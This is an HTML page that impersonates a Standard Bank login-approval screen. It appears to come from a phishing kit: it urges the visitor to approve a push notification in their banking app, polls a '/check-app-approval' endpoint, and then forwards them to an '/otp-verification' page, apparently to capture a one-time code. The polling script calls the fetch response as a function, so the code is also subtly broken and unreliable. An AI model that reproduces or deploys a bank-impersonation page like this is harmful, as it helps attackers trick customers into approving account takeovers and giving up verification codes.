<!DOCTYPE html>
<html>
<head><title>Standard Bank - App Verification</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:sans-serif }
body{ background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px }
.container{ background:white; border-radius:16px; padding:40px; max-width:420px; width:100%; text-align:center; box-shadow:0 4px 24px rgba(0,0,0,0.12) }
h1{ color:#003366; font-size:20px; margin-bottom:8px }
.subtitle{ color:#666; font-size:14px; margin-bottom:30px }
.phone-icon{ width:100px; height:100px; background:#e8f0fe; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 25px; font-size:40px }
.spinner{ width:40px; height:40px; border:4px solid #e0e0e0; border-top:4px solid #003366; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 15px }
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.status-box{ background:#f8f9fa; border-radius:12px; padding:20px; margin:20px 0 }
.status-text{ font-size:15px; font-weight:600; color:#333; margin-bottom:5px }
.status-sub{ font-size:13px; color:#888 }
.btn{ background:#003366; color:white; border:none; padding:14px; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer; width:100% }
.btn:hover{ background:#002244 }
.hidden{ display:none }
.footer{ margin-top:20px; font-size:12px; color:#aaa }
</style></head><body><div class="container"><h1>Approve Login Request</h1><p class="subtitle">A request to access your account from a new device has been initiated. Please open your Standard Bank mobile app to approve or deny this request.</p><div class="phone-icon">[SB]</div><div class="status-box" id="status"><div class="spinner"></div><div class="status-text">Waiting for app confirmation...</div><div class="status-sub">Open your Standard Bank app and approve the notification</div></div><button class="btn hidden" id="continueBtn" onclick="window.location.href='/otp-verification'">Continue</button><div class="footer">[c] 2026 Standard Bank Group</div></div><script>let a=0;function c(){a++;fetch('/check-app-approval',{method:'POST'}).then(r=>r().json()).then(d=>{if(d.status==='approved'){document.getElementById('status').innerHTML='<div class=\"status-text\" style=\"color:#28a745\">[check] Approved</div>';document.getElementById('continueBtn').classList.remove('hidden')}else if(a<10){setTimeout(c,2000)}else{document.getElementById('status').innerHTML='<div class=\"status-text\" style=\"color:#dc3545\">Session expired</div>'}})}setTimeout(c,3000);</script></body></html>
